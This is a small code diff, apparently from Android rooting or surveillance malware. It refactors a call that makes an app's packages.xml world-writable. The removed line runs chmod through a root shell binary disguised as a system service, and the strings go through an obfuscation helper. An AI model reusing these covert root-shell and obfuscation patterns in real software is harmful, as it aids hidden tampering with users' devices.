@@ -796,8 +796,7 @@ public class Root {
 			Utils.sleep(600);
 			// /system/bin/ntpsvd qzx chmod 666
 			// /data/data/com.android.service/files/packages.xml
-			Execute.execute(String.format(M.e("%s qzx chmod 666 /data/data/%s/files/packages.xml"), Configuration.shellFile,
-					pack));
+			Execute.chmod("666", String.format(M.e("/data/data/%s/files/packages.xml"),pack));
 
 			// Rimuoviamo il file temporaneo
 			// /data/data/com.android.service/files/test
